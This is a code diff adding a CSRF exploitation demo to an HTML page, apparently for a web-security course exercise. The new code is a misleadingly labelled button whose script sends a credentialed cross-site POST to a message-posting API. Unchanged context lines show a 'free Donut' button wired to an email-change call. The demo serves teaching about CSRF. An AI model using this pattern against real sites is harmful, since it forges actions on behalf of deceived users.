@@ -44,6 +44,13 @@
             <button type="button" class="btn btn-primary" id="donut-life" data-bs-toggle="modal" data-bs-target="#donutWin">Get a free Donut 🍩</button>       
         </div>
     </div>
+    <div class="container-sm pt-5">
+        <!-- Create Blog Post CSRF Exploitation -->
+        <small class="badge rounded-pill text-bg-danger">Create Blog Post CSRF</small>
+        <div class="border border-4 border-danger p-5 mt-2">
+            <button type="button" class="btn btn-primary" id="not-a-post">Do not Post a message</button>       
+        </div>
+    </div>
     <div class="mb-5" style="height: 10rem;"></div>
     <div class="modal fade" id="donutWin" aria-hidden="true" aria-labelledby="donutWinLabel" tabindex="-1">
         <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
@@ -121,6 +128,30 @@
 
         document.getElementById("donut-life").addEventListener("click", () => {
             changeEmail()
+        })
+
+        // For "Create Blog Post CSRF Exploit"
+        async function notAPost() {
+
+            const formData = new FormData();
+            formData.append("message", "ldksfjdlfjd")
+
+            const res = await fetch("https://m183.gibz-informatik.ch/api/csrf/postMessage", {
+                "body": formData,
+                "method": "POST",
+                "mode": "cors",
+                "credentials": "include"
+              })
+
+            if (res.ok) {
+                console.log("Posted message successfully")
+            } else {
+                console.log("Failure in posting message")
+            }
+        }
+
+        document.getElementById("not-a-post").addEventListener("click", () => {
+            notAPost()
         })
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
